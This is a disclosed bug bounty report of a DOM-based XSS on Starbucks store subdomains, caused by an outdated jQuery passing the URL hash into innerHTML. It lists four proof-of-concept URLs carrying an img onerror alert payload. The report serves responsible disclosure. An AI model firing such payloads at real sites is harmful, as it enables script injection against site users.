# Dom Based Xss DIV.innerHTML  parameters store.starbucks*

## Report Details
- **Report ID**: 188185
- **URL**: https://hackerone.com/reports/188185
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-12-04T10:44:58.569Z
- **Disclosed**: 2017-01-12T22:33:36.723Z

## Reporter
- **Username**: e3xpl0it
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hi! this subdomain store.starbucks* vulnerable to dom based xss. 
you are using the vulnerable library jQuery.V1_10_1	
parameters location.hash DIV.innerHTML .
Vulnerable all subdomains store.starbucks*
It works Chrome,and IE 11 the current version
POC
http://shop.starbucks.de/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.ca/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.fr/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>
http://store.starbucks.co.uk/on/demandware.store/Sites-StarbucksDE-Site/de_DE/Default-Start?#a.remote[href$=<img onerror="alert(document.domain)" src=x.jpg"/>

## Attachments
- store.starbucks.de-dom_xss.jpg
- store.starbucks.co.uk_-dom_xss.jpg
